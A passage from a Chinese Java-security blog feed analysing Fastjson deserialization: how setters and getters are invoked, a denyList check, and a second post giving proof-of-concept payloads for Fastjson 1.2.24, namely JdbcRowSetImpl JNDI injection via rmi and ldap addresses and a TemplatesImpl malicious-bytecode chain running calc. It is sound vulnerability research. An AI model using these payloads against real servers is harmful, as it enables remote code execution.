<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">长度大于4</span><br><span class="line">非静态方法</span><br><span class="line">无参数</span><br><span class="line">返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</span><br></pre></td></tr></table></figure></div>

<p>而且在创建<strong>derializer</strong>之前，反射加载的类会对类进行黑名单检查，在<strong>1.2.24</strong>后面的版本中会使用到</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......    </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">	className = className.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">    	<span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">    	<span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调用setter方法"><a href="#调用setter方法" class="headerlink" title="调用setter方法"></a>调用setter方法</h3><p>之后一路返回到<strong>parseObject</strong>中</p>
<p>调用<strong>setter</strong>方法主要是在<strong>deserialze</strong>中</p>
<p>一路走到<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong>方法中的**fieldDeser.setValue(object, fieldValue)**方法</p>
<p>在<strong>package com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue</strong>中</p>
<p>有个<strong>method.invoke(object, value)<strong>调用了</strong>setter</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setContextFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">            <span class="keyword">if</span> (key ==JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                <span class="comment">//省略部分代码......</span></span><br><span class="line">                <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">                <span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setContext(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调用getter方法"><a href="#调用getter方法" class="headerlink" title="调用getter方法"></a>调用getter方法</h3><p>我们可以看到在上面的例子中，不只是调用了<strong>setter</strong>，还调用了<strong>getter</strong></p>
<p>具体是在最开始调用<strong>parseObject</strong>的地方，有个<strong>toJSON</strong>方法中调用了<strong>getter</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一路走到<strong>toJSON</strong>，在<strong>toJSON</strong>中调用了<strong>getObjectWriter</strong>方法</p>
<p>主要是用来根据指定的类信息获取对应的<strong>ObjectSerializer</strong>对象</p>
<p>先通过缓存查找，若找不出，在根据<strong>ObjectSerializerFactory</strong>工厂对象中查找对应的<strong>ObjectSerializer</strong>实例</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">toJSON</span><span class="params">(Object javaObject, SerializeConfig config)</span> &#123;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">ObjectSerializer</span> <span class="variable">serializer</span> <span class="operator">=</span> config.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着往下有个<strong>if</strong>判断，主要关注<strong>try</strong>中的<strong>getFieldValuesMap</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">toJSON</span><span class="params">(Object javaObject, SerializeConfig config)</span> &#123;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (serializer <span class="keyword">instanceof</span> JavaBeanSerializer) &#123;</span><br><span class="line">    	<span class="type">JavaBeanSerializer</span> <span class="variable">javaBeanSerializer</span> <span class="operator">=</span> (JavaBeanSerializer) serializer;    </span><br><span class="line">    	<span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    	<span class="keyword">try</span> &#123;</span><br><span class="line">        	Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);</span><br><span class="line">        	<span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;</span><br><span class="line">            	json.put(entry.getKey(), toJSON(entry.getValue()));</span><br><span class="line">        	&#125;</span><br><span class="line">    	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;toJSON error&quot;</span>, e);</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> json;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<strong>getFieldValuesMap</strong>中的<strong>for</strong>循环里，调用了<strong>getPropertyValue</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getFieldValuesMap</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;(sortedGetters.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (FieldSerializer getter : sortedGetters) &#123;</span><br><span class="line">        map.put(getter.fieldInfo.name, getter.getPropertyValue(object));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<strong>getPropertyValue</strong>方法中又调用了<strong>get</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getPropertyValue</span><span class="params">(Object object)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">propertyValue</span> <span class="operator">=</span>  fieldInfo.get(object);</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进去<strong>get</strong>方法后可以看到，利用<strong>invoke</strong>调用了<strong>getter</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object javaObject)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> method.invoke(javaObject, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> field.get(javaObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-反序列化漏洞"><a href="#0x03-反序列化漏洞" class="headerlink" title="0x03 反序列化漏洞"></a>0x03 反序列化漏洞</h1><p>根据前面的分析，可以知道<strong>parse</strong>会调用<strong>setter</strong>方法，<strong>parseObject</strong>会调用<strong>setter</strong>和<strong>getter</strong>方法，并且都会调用<strong>构造函数</strong></p>
<p>由于存在<strong>autoType</strong>特性，所以说</p>
<p>如果**@type<strong>中标识的类里的</strong>构造函数<strong>、</strong>setter<strong>和</strong>getter<strong>存在恶意代码，那么就可能存在</strong>fastjson**反序列化漏洞</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><ul>
<li><strong>CalcTest</strong></li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class CalcTest &#123;</span><br><span class="line">    public String calc;</span><br><span class="line"></span><br><span class="line">    public CalcTest() &#123;</span><br><span class="line">        System.out.println(&quot;构造函数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getCalc() &#123;</span><br><span class="line">        System.out.println(&quot;getter&quot;);</span><br><span class="line">        return calc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setCalc(String calc) throws IOException &#123;</span><br><span class="line">        this.calc = calc;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        System.out.println(&quot;setter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>FastjsonTest</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JsonCalc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.CalcTest\&quot;,\&quot;Calc\&quot;:\&quot;kkk\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(JsonCalc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>成功执行了<strong>setter</strong>中的代码</p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>根据上面的分析可以知道，我们只要找到合适的<strong>JavaBean</strong>，并且满足以下两点就有可能存在漏洞点</p>
<ul>
<li>该类的<strong>构造函数</strong>、<strong>setter</strong>方法、<strong>getter</strong>方法中的某一个存在危险操作，比如造成命令执行</li>
<li>可以控制该漏洞函数的变量（一般就是该类的属性）</li>
</ul>
<h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><p><a class="link"   href="https://goodapple.top/archives/832" >https://goodapple.top/archives/832 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80" >https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/" >https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化(二)</title>
    <url>/2023/10/04/Java%E5%AE%89%E5%85%A8/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%BA%8C)/</url>
    <content><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>我们先来看最开始的漏洞版本是&lt;&#x3D;1.2.24，在这个版本前是默认支持<code>@type</code>这个属性的</p>
<p>这个版本的jastjson有两条利用链——<strong>JdbcRowSetImpl</strong>和<strong>Templateslmpl</strong></p>
<h1 id="0x01-JdbcRowSetImpl-反序列化"><a href="#0x01-JdbcRowSetImpl-反序列化" class="headerlink" title="0x01 JdbcRowSetImpl 反序列化"></a>0x01 JdbcRowSetImpl 反序列化</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li><strong>JDK 8U65</strong></li>
<li><strong>1.2.22 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.24</strong></li>
<li>出网</li>
</ul>
<p>注：<strong>JDK</strong>版本尽量在未修复<strong>JDNI</strong>漏洞之前，主要是为了分析漏洞点</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先在<strong>com.sun.rowset.JdbcRowSetImpl#connect()<strong>方法里调用了</strong>lookup</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">           <span class="comment">//省略部分代码......</span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看一下<strong>getDataSourceName</strong>做了什么，返回了个<strong>dataSource</strong>，可以看一下<strong>dataSource</strong>是否可控</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<strong>javax.sql.rowset.BaseRowSet#getDataSourceName</strong>方法中，可以看到是<strong>dataSource</strong>可控的</p>
<p>所以<strong>lookup</strong>中的参数就是可控的<strong>dataSource</strong>，存在<strong>JNDI</strong>注入</p>
<p>而且也符合调用<strong>setter</strong>条件</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">        dataSource = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       dataSource = name;</span><br><span class="line">    &#125;</span><br><span class="line">    URL = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以找到<strong>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</strong>方法中调用了<strong>connect</strong>方法</p>
<p>也符合<strong>setter</strong>要求</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>首先写入**@type<strong>对应的类名</strong>com.sun.rowset.JdbcRowSetImpl**</p>
<p>第二步写入<strong>JNDI</strong>注入的地址</p>
<p>第三步写入要调用的方法</p>
<h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/vBPQAsoG\&quot;,&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                	<span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/vBPQAsoG\&quot;,&quot;</span> +</span><br><span class="line">               		<span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-Templateslmpl反序列化"><a href="#0x02-Templateslmpl反序列化" class="headerlink" title="0x02 Templateslmpl反序列化"></a>0x02 Templateslmpl反序列化</h1><p><strong>Fastjson</strong>通过**_bytecodes<strong>字段传入恶意类，调用</strong>outputProperties<strong>属性的</strong>getter**方法时，实例化传入的恶意类，调用其构造方法，造成任意命令执行。</p>
<p><strong>Templateslmpl</strong>利用链在<strong>CC3 chain</strong>中就有用到过</p>
<p>原因是<strong>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</strong>方法中调用了<strong>newInstance</strong>方法，实例化了**_class**对象，导致了恶意动态类加载</p>
<p>而其中的构造参数我们容易控制，这就造成了一些反序列化漏洞。</p>
<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">	TemplatesImpl.newTransformer()</span><br><span class="line">		TemplatesImpl.getTransletInstance()</span><br><span class="line">			TemplatesImpl.defineTransletClasses()</span><br><span class="line">				TemplatesImpl.TransletClassLoader</span><br><span class="line">				TransletClassLoader.defineClass()</span><br></pre></td></tr></table></figure></div>

<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><ul>
<li>恶意类</li>
</ul>
<p>需要将其先编译，然后将<strong>class</strong>文件转为<strong>base64</strong>形式</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>payload</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Templateslmpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66v...AEAIgABACMAAAACACQ=\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_name\&quot;:\&quot;hello\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_tfactory\&quot;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>调试路线</li>
</ul>
<p><strong>JavaBeanDeserializer</strong> —&gt; <strong>FieldDeserializer</strong>之间会循环</p>
<p>当<strong>key &#x3D;&#x3D;  _outputProperties</strong>时，才会调用<strong>invoke</strong>，后面就是<strong>CC3 chain</strong>的调用了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">JSON.parseObject()</span><br><span class="line">	DefaultJSONParser.parse()</span><br><span class="line">	parse.parseObject()</span><br><span class="line">	parseObject#deserializer.deserialze()</span><br><span class="line">		JavaBeanDeserializer.parseField()</span><br><span class="line">		parseField.parseField()</span><br><span class="line">		fieldDeserializer.parseField()</span><br><span class="line">			DefaultFieldDeserializer.parseField()</span><br><span class="line">			parseField.setValue()</span><br><span class="line">				FieldDeserializer.setValue()</span><br><span class="line">				method.invoke()</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h1><p><a class="link"   href="https://www.javasec.org/java-vuls/FastJson.html" >https://www.javasec.org/java-vuls/FastJson.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#0x03-%E5%9F%BA%E4%BA%8E-TemplatesImpl-%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE" >https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#0x03-%E5%9F%BA%E4%BA%8E-TemplatesImpl-%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Java序列化与反序列化</title>
    <url>/2023/09/09/Java%E5%AE%89%E5%85%A8/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程</p>
<p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程</p>
<h1 id="0x01-为什么需要序列化和反序列化"><a href="#0x01-为什么需要序列化和反序列化" class="headerlink" title="0x01 为什么需要序列化和反序列化"></a>0x01 为什么需要序列化和反序列化</h1><p>当两个Java进程进行通信时，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；接收方需要从字节序列中恢复出Java对象。</p>
<h1 id="0x02-序列化和反序列化的作用"><a href="#0x02-序列化和反序列化的作用" class="headerlink" title="0x02 序列化和反序列化的作用"></a>0x02 序列化和反序列化的作用</h1><ul>
<li>数据持久化：</li>
</ul>
<p>将对象转换为字节流后，可以将字节流保存到磁盘或数据库中，实现数据的持久化。在下次需要时，可以从存储介质中读取字节流并进行反序列化，重新得到原始对象。</p>
<ul>
<li>远程通信：</li>
</ul>
<p>在分布式系统中，不同的计算节点之间需要进行数据的传输和共享。通过序列化和反序列化，可以将对象转换为可传输的字节流，在网络上进行传输，并在接收端反序列化为对象。</p>
<ul>
<li>缓存机制：</li>
</ul>
<p>在缓存技术中，可以通过将对象序列化后存储在缓存中，下次需要时直接从缓存中读取并反序列化为对象，提高数据的读取效率。</p>
<ul>
